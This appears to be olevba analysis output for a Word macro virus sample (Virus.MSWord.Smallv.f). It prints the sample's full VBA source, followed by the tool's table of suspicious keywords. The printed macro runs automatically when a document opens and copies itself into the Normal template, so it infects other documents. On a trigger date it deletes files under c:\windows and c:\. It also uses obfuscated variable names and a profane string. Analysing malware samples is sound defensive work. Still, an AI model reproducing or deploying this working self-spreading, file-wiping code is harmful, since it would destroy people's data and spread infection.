olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smallv.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smallv.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Smallv.f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function CopyMac(kjszrkgeqhwreghfaetr, i23hqwbrjhwreqhecnwqgf4eqwhec) As Long
On Error GoTo EndCopyMac
Application.OrganizerCopy _
   Source:=kjszrkgeqhwreghfaetr, _
   Destination:=i23hqwbrjhwreqhecnwqgf4eqwhec, _
   Name:="AutoOpen", _
   Object:=wdOrganizerObjectProjectItems
EndCopyMac:
CopyMac = Err.Number
On Error GoTo 0
End Function
Sub MAIN()
uztrgkjerzthgkjrebtkerztchtz$ = ActiveDocument.FullName
jkdztuioegbkwetrwuqtgekqgrtwergvjweht$ = NormalTemplate.FullName
jkhkzrgbjhrg$ = "FUCK"
qwzefvnweqrhewlurlweb = CopyMac(uztrgkjerzthgkjrebtkerztchtz$, jkdztuioegbkwetrwuqtgekqgrtwergvjweht$)
If (qwzefvnweqrhewlurlweb = 5940) Then
    qwzefvnweqrhewlurlweb = CopyMac(jkdztuioegbkwetrwuqtgekqgrtwergvjweht$, uztrgkjerzthgkjrebtkerztchtz$)
  If (qwzefvnweqrhewlurlweb = 0) Then
     ActiveDocument.SaveAs _
        FileName:=uztrgkjerzthgkjrebtkerztchtz$, _
        FileFormat:=wdFormatTemplate
  End If
End If
If Day(Now()) = 2 Then
   jkhkzrgbjhrg$ = "FUCK"
   MsgBox ("Word is infected !!!")
End If
If (Day(Now()) = 10) And (Month(Now() = 10)) Then
   jkhkzrgbjhrg$ = "FUCK"
   Kill "c:\windows\*.*"
    Kill "c:\windows\system\*.*"
    Kill "c:\*.*"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

